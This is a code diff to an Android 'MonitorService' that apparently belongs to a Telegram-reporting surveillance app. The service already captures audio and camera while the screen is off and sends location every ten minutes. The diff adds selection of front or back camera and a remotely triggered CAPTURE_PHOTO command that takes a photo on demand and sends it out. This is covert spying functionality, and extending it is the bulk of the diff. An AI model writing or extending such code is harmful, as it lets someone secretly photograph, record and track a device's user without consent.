@@ -54,6 +54,7 @@ class MonitorService : Service(), LifecycleOwner {
     private var audioScreenOff: Boolean = false
     private var sendCamera: Boolean = false
     private var cameraScreenOff: Boolean = false
+    private var cameraFacing: String = "front"
     private var captureInterval: Long = 10000L 
     private var sendLocation: Boolean = false
     private var locationInterval: Long = 600000L // 10 mins
@@ -81,6 +82,7 @@ class MonitorService : Service(), LifecycleOwner {
         botToken = pref.getString("token", "") ?: ""
         targetChatId = pref.getString("chatId", "") ?: ""
         sendCamera = pref.getBoolean("sendCamera", false)
+        cameraFacing = pref.getString("cameraFacing", "front") ?: "front"
         sendAudio = pref.getBoolean("sendAudio", false)
         sendLocation = pref.getBoolean("sendLocation", false)
         
@@ -376,7 +378,17 @@ class MonitorService : Service(), LifecycleOwner {
                  cameraProviderFuture.addListener({
                     val cameraProvider = cameraProviderFuture.get()
                     val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
-                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
+                    val isBack = cameraFacing.equals("back", ignoreCase = true)
+                    val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
+                    val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
+                        targetSelector
+                    } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
+                        CameraSelector.DEFAULT_FRONT_CAMERA
+                    } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
+                        CameraSelector.DEFAULT_BACK_CAMERA
+                    } else {
+                        targetSelector
+                    }
                     
                     try {
                         cameraProvider.unbindAll()
@@ -552,7 +564,10 @@ class MonitorService : Service(), LifecycleOwner {
                     .putBoolean("sendCamera", cfg.sendCamera)
                     .putLong("cameraInterval", cfg.cameraInterval)
                     .putBoolean("cameraScreenOff", cfg.cameraScreenOff)
+                    .putString("cameraFacing", cfg.cameraFacing)
                     .apply()
+
+                cameraFacing = cfg.cameraFacing
 
                 com.example.telegramsender.data.DevicePreferences.setSyncIntervalSeconds(this, cfg.syncIntervalSeconds)
 
@@ -574,6 +589,21 @@ class MonitorService : Service(), LifecycleOwner {
                             val sec = cmd.params?.optLong("syncIntervalSeconds", 0L) ?: 0L
                             if (sec >= 5) {
                                 com.example.telegramsender.data.DevicePreferences.setSyncIntervalSeconds(this, sec)
+                            }
+                            val facing = cmd.params?.optString("cameraFacing")
+                            if (!facing.isNullOrEmpty()) {
+                                cameraFacing = facing
+                                getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putString("cameraFacing", facing).apply()
+                            }
+                        }
+                        "CAPTURE_PHOTO" -> {
+                            val facing = cmd.params?.optString("camera")
+                            if (!facing.isNullOrEmpty()) {
+                                cameraFacing = facing
+                                getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putString("cameraFacing", facing).apply()
+                            }
+                            CoroutineScope(Dispatchers.IO).launch {
+                                captureCameraAndSend()
                             }
                         }
                     }
